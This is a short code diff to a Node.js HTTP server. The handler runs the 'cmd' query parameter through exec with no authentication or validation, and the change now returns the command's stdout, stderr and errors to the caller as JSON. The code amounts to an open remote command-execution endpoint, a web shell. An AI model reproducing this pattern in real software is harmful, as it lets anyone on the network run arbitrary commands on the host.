@@ -14,14 +14,17 @@ const requestHandler = (request, response) => {
   const cmd = query.cmd
 
   const child = exec(cmd, function (error, stdout, stderr) {
-    console.log(`stdout: ${stdout}`);
-    console.log(`stderr: ${stderr}`);
-    if (error !== null) {
-      console.log(`exec error: ${error}`);
+    const hash = {
+      stdout: stdout,
+      stderr: stderr,
+      execerror: null
     }
-  });
+    if (error !== null) {
+      hash.execerror = error
+    }
 
-  response.end(cmd)
+    response.end(JSON.stringify(hash))
+  });
 }
 
 const server = http.createServer(requestHandler)
